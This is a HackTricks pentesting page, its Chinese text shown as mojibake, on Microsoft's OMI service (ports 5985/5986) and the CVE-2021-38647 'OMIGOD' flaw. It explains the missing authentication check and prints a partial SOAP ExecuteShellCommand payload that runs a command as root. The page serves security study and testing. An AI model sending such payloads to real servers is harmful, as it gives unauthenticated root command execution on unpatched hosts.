# 5985,5986 - Pentesting OMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### **åŸºæœ¬ä¿¡æ¯**

**OMI** è¢«å¾®è½¯ä½œä¸ºä¸€ä¸ª **[å¼€æº](https://github.com/microsoft/omi)** å·¥å…·å‘å¸ƒï¼Œæ—¨åœ¨è¿›è¡Œè¿œç¨‹é…ç½®ç®¡ç†ã€‚å®ƒç‰¹åˆ«é€‚ç”¨äºåœ¨ Azure ä¸Šä½¿ç”¨ä»¥ä¸‹æœåŠ¡çš„ Linux æœåŠ¡å™¨ï¼š

- **Azure è‡ªåŠ¨åŒ–**
- **Azure è‡ªåŠ¨æ›´æ–°**
- **Azure è¿è¥ç®¡ç†å¥—ä»¶**
- **Azure æ—¥å¿—åˆ†æ**
- **Azure é…ç½®ç®¡ç†**
- **Azure è¯Šæ–­**

å½“è¿™äº›æœåŠ¡è¢«æ¿€æ´»æ—¶ï¼Œè¿›ç¨‹ `omiengine` ä»¥ root èº«ä»½å¯åŠ¨å¹¶ç›‘å¬æ‰€æœ‰æ¥å£ã€‚

**é»˜è®¤ç«¯å£** ä½¿ç”¨ **5985** (http) å’Œ **5986** (https)ã€‚

### **[CVE-2021-38647 æ¼æ´](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)**

å¦‚åœ¨ 9 æœˆ 16 æ—¥è§‚å¯Ÿåˆ°çš„ï¼Œéƒ¨ç½²åœ¨ Azure ä¸Šçš„ Linux æœåŠ¡å™¨ç”±äº OMI çš„ä¸€ä¸ªæ˜“å—æ”»å‡»ç‰ˆæœ¬è€Œæ˜“å—æ”»å‡»ã€‚æ­¤æ¼æ´åœ¨äº OMI æœåŠ¡å™¨é€šè¿‡ `/wsman` ç«¯ç‚¹å¤„ç†æ¶ˆæ¯æ—¶ä¸éœ€è¦èº«ä»½éªŒè¯å¤´ï¼Œé”™è¯¯åœ°æˆæƒäº†å®¢æˆ·ç«¯ã€‚

æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸å¸¦èº«ä»½éªŒè¯å¤´çš„ "ExecuteShellCommand" SOAP æœ‰æ•ˆè´Ÿè½½æ¥åˆ©ç”¨æ­¤æ¼æ´ï¼Œè¿«ä½¿æœåŠ¡å™¨ä»¥ root æƒé™æ‰§è¡Œå‘½ä»¤ã€‚
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
æœ‰å…³æ­¤CVEçš„æ›´å¤šä¿¡æ¯ **[è¯·æŸ¥çœ‹æ­¤å¤„](https://github.com/horizon3ai/CVE-2021-38647)**ã€‚

## å‚è€ƒèµ„æ–™

* [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
* [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶(ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶(GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
